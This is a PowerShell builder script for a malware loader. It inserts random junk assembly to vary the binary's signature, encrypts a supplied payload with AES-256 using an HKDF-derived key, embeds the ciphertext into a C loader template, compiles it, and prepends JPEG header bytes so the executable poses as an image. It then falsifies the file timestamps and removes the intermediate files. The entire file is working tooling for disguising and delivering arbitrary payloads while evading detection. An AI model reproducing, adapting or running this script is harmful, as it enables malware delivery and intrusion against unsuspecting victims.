param (
    [string]$Image,
    [string]$Payload,
    [string]$BaseKey,
    [string]$Salt,
    [string]$IV
)

$Template = "quantum_loader_win.c"
$WorkingC = "quantum_temp.c"
$OutputExe = "quantum_loader_win.exe"
$FinalImage = $Image

# Generate junk.h
Write-Host "[*] Generating junk.h..."
$instructions = @("nop", "mov eax, eax", "push eax; pop eax")
$count = Get-Random -Minimum 1 -Maximum 6
$asm = ""
for ($i = 0; $i -lt $count; $i++) {
    $asm += $instructions[(Get-Random -Maximum $instructions.Length)] + ";"
}
"#define JUNK_ASM __asm { $asm }" | Out-File "junk.h" -Encoding ASCII

# Encrypt payload
Write-Host "[*] Encrypting payload..."
$derived_key = & openssl hkdf -binary -md sha256 -keylen 32 -salt $Salt -inkey $BaseKey
& openssl enc -aes-256-cbc -in $Payload -out encrypted.bin -K $derived_key -iv $IV -nopad

# Convert to C byte arrays
$encPayloadHex = (Get-Content encrypted.bin -Encoding Byte | ForEach-Object { '\x{0:X2}' -f $_ }) -join ''
$saltHex = ($Salt | ForEach-Object { '\x{0:X2}' -f [byte][char]$_ }) -join ''
$ivHex = ($IV | ForEach-Object { '\x{0:X2}' -f [byte][char]$_ }) -join ''
$baseKeyHex = ($BaseKey | ForEach-Object { '\x{0:X2}' -f [byte][char]$_ }) -join ''

# Generate C code
Write-Host "[*] Embedding encrypted payload..."
(Get-Content $Template) `
    -replace '__ENCRYPTED_PAYLOAD__', $encPayloadHex `
    -replace '__FIXED_SALT__', $saltHex `
    -replace '__IV__', $ivHex `
    -replace '__BASE_KEY__', $baseKeyHex `
    | Set-Content $WorkingC

# Compile
Write-Host "[*] Compiling..."
if (Get-Command cl.exe -ErrorAction SilentlyContinue) {
    cl.exe /nologo /Os /MT /Fe:$OutputExe $WorkingC bcrypt.lib winhttp.lib > $null
} else {
    Write-Error "❌ cl.exe not found."
    exit 1
}

# Create polyglot image
Write-Host "[*] Creating JPEG+EXE polyglot..."
[System.IO.File]::WriteAllBytes($FinalImage, [byte[]]@(0xFF, 0xD8, 0xFF, 0xE0) + [System.IO.File]::ReadAllBytes($OutputExe))

# Spoof timestamp
(Get-Item $FinalImage).LastWriteTime = Get-Date "09/11/2001 06:06:06"
(Get-Item $FinalImage).CreationTime = Get-Date "09/11/2001 06:06:06"

Write-Host "`n✅ Polyglot payload ready: $FinalImage"
Remove-Item $WorkingC, encrypted.bin, junk.h, $OutputExe
